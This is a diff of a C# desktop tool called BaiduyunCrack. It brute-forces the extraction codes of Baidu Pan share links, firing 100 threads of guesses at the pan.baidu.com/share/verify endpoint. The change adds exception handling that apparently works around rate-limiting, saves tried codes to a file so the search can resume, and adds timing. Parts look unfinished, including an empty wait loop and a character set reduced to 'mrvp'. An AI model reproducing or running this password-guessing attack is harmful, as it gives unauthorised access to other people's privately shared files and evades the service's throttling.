@@ -17,6 +17,15 @@ namespace BaiduyunCrack
 	public partial class Form1 : Form
 	{
 		private static bool isFind = false;
+		private static bool isHasException = false;
+		private static string baiduyunLink = "";
+		private static string logid = "";
+		private static DateTime startTime = DateTime.Now;
+		private static List<string> usedPwdList = new List<string>() { "asdf"};
+		private static int exceptionCount = 0;
+
+		private static double waitTimeSeconds = 60;//(单位：秒)
+		private static DateTime lastHasExceptionTime = DateTime.Now;
 		public Form1()
 		{
 			InitializeComponent();
@@ -27,13 +36,14 @@ namespace BaiduyunCrack
 		{
 			lblStartTime.Text = "";
 			lblStopTime.Text = "";
-			tbxUltimatelyPwd.Text = ""; 
+			tbxUltimatelyPwd.Text = "";
+			lblTotalSeconds.Text = "";
 			//异常情况，远程服务器直接挂掉，分享接口挂掉，404，不怪我
 		}
 
 		private void btnStart_Click(object sender, EventArgs e)
 		{
-			var baiduyunLink = tbxBaiduyunAddr.Text;
+			baiduyunLink = tbxBaiduyunAddr.Text;
 			if (string.IsNullOrWhiteSpace(baiduyunLink))
 			{
 				tbxBaiduyunAddr.Text = "";
@@ -42,15 +52,48 @@ namespace BaiduyunCrack
 				return;
 			}
 
+			startTime = DateTime.Now;
+			lblStartTime.Text = startTime.ToStr();
 
-			lblStartTime.Text = DateTime.Now.ToStr();
+			var logid = getLogid(baiduyunLink);
+			int threadCount = 100; //线程数
+
+			//找到对应的 baiduyunLink.json文件
+			//WriteUsedPwdToFile(baiduyunLink, usedPwdList);
 
 			//所有密码列表生成
 			var allPwdList = GetAllPwdList();
 
-			int threadCount = 100; //线程数
 
-			var group = GetGroupList(allPwdList, threadCount);
+			FindIt(allPwdList, threadCount);
+
+
+
+
+		}
+
+		private void Wait()
+		{
+			ThreadPool.QueueUserWorkItem(o =>
+			{
+				while (true)
+				{
+					Thread.Sleep(1);
+					if (!isHasException) //如果没有异常，跳过
+					{
+						Thread.Sleep(500);
+						continue;
+					}
+					//如果有异常，则执行等待，并等倒计时结束后，继续用剩下未用过的密码进行破解
+
+				}
+			});
+
+		}
+
+		private void FindIt(List<string> pwdlist, int threadCount)
+		{
+			var group = GetGroupList(pwdlist, threadCount);
 
 			for (int i = 0; i < group.Count(); i++)
 			{
@@ -66,12 +109,33 @@ namespace BaiduyunCrack
 						{
 							return;
 						}
+						if (isHasException)
+						{
+							return;
+						}
 						BeginInvoke(new Action(() =>
 						{
 							tbxUltimatelyPwd.Text = pwd;
 						}));
 						Debug.WriteLine(pwd);
-						var result = getResult(baiduyunLink, pwd);
+						string result = "";
+						try
+						{
+							result = getResult(baiduyunLink, pwd);
+						}
+						catch (Exception)
+						{
+							isHasException = true;
+							Debug.WriteLine("出现异常了");
+							exceptionCount++;
+							usedPwdList.Add(pwd);
+							lastHasExceptionTime = DateTime.Now;
+
+							//将用过的pwd存入文件
+							WriteUsedPwdToFile(baiduyunLink, usedPwdList);
+
+							return;
+						}
 						Debug.WriteLine(result);
 						var rObj = result.DeserializeObject<BaiduYunResult>();
 						if (rObj.errno == 0)
@@ -81,14 +145,34 @@ namespace BaiduyunCrack
 							Debug.WriteLine("找到了");
 							BeginInvoke(new Action(() =>
 							{
-								lblStopTime.Text = DateTime.Now.ToStr();
+								var stopTime = DateTime.Now;
+								lblStopTime.Text = stopTime.ToStr();
+								lblTotalSeconds.Text = (stopTime - startTime).TotalSeconds.ToString("0.00") + " s";
 								tbxUltimatelyPwd.Text = thePwd;
 							}));
 							return;
 						}
+						else
+						{
+							usedPwdList.Add(pwd);
+						}
 					}
 				}, i);
 			}
+		}
+
+		private void WriteUsedPwdToFile(string baiduyunLink, List<string> usedPwdList)
+		{
+			string writeStr = usedPwdList.SerializeObject();
+			//int len = Encoding.UTF8.GetBytes(writeStr).Count();
+			//using (FileStream file = File.Create($"jsonfile/{baiduyunLink}.json",len,FileOptions.))
+
+			var path = Path.Combine(Environment.CurrentDirectory, "jsonfile\\" + baiduyunLink.Split('?')[1].Split('=')[1] + ".txt");
+			if(!Directory.Exists(Path.GetFullPath(path)))
+			{
+				Directory.CreateDirectory(Path.GetFullPath(path));
+			}
+			File.WriteAllText(path, writeStr);
 		}
 
 		private List<string> GetAllPwdList()
@@ -175,8 +259,8 @@ namespace BaiduyunCrack
 
 		public static string GetCodes()
 		{
-			return "0123456789abcdefghijklmnopqrstuvwxyz";
-			//return "mrvp";
+			//return "0123456789abcdefghijklmnopqrstuvwxyz";
+			return "mrvp";
 		}
 		/// <summary>
 		/// 是否在范围内，左闭右开 [,)
@@ -206,7 +290,7 @@ namespace BaiduyunCrack
 			{
 				dict.Add(aItem.Split('=')[0], aItem.Split('=')[1]);
 			}
-			return dict["BAIDUID"] + "=1";
+			return dict.FirstOrDefault(m => m.Key == "BAIDUID").Value + "=1";
 		}
 
 		public static string SendDataByGET(string Url, string surl, string postDataStr, string formParamStrs, ref CookieContainer cookie)
@@ -263,7 +347,7 @@ namespace BaiduyunCrack
 
 		string getResult(string baiduyunLink, string pwd)
 		{
-			var logid = getLogid(baiduyunLink);
+
 			string surl = baiduyunLink.Split('?')[1].Split('=')[1];
 			string postUrl = "https://pan.baidu.com/share/verify";
 			string postParamstr = $"{baiduyunLink.Split('?')[1]}&t={getTime()}" +
